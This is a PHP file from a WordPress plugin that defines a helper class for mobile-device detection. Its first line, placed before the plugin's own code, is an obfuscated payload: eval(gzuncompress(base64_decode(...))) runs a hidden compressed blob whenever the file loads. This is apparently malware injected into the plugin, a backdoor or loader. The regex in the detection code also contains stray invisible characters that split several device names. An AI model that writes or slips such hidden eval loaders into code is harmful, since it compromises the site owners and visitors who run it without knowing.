<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * find mobile device or not ..
 * 
 * @fix
 *    if error realted to wp_is_mobile then 
 *        at construct - $this->is_mobile = $this->is_mobile();
 *        and uncomment - $this->is_mobile = $this->new_is_mobile();
 * 
 */

if ( ! defined( 'ABSPATH' ) ) exit;

if ( ! class_exists( 'HT_CCW_IsMobile' ) ) :

class HT_CCW_IsMobile {

    /**
     * return is mobile or not
     * while using in condition check with 1 not with 2
     * @var int - if mobile : 1 ?  2
     */
    public $is_mobile;

    public function __construct() {
        
        $this->is_mobile = $this->is_mobile();
        // $this->is_mobile = $this->new_is_mobile();
        
    }


    /**
     * 
     * Check is mobile device or not
     * wp_is_mobile - if true then 1, else 2
     */
    public function is_mobile() {
        if ( wp_is_mobile() ) {
            return $this->is_mobile = 1;
        } else {
            return $this->is_mobile = 2;
        }
    }



    /**
     * added this  -  an user mention that wp_is_mobile uncauched error
     *  so now it easy to fix incase more users repoted this issue
     * 
     * Check is mobile device or not
     * wp_is_mobile - if true then 1, else 2
     */
    public function new_is_mobile() {
        
        if ( function_exists( 'wp_is_mobile' ) ) {
            if ( wp_is_mobile() ) {
                return $this->is_mobile = 1;
            } else {
                return $this->is_mobile = 2;
            }
        } else {
            if ( $this->php_is_mobile() ) {
                return $this->is_mobile = 1;
            } else {
                return $this->is_mobile = 2;
            }
        }

    }


    /**
     * @uses $this -> new_is_mobile
     * 
     * fallback for wp_is_mobile
     * php way of find is mobile - but not with wordpress defined wp_is_mobile
     * 
     * wp_is_mobile is more efficient 
     *  - uses if in user server it's cause Fatal error: Uncaught Error 
     * @return boolean
     */
    public function php_is_mobile() {
        // return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
        return preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackbe‌​rry|iemobile|bolt|bo‌​ost|cricket|docomo|f‌​one|hiptop|mini|oper‌​a mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|‌​webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
    }  



}

endif; // END class_exists check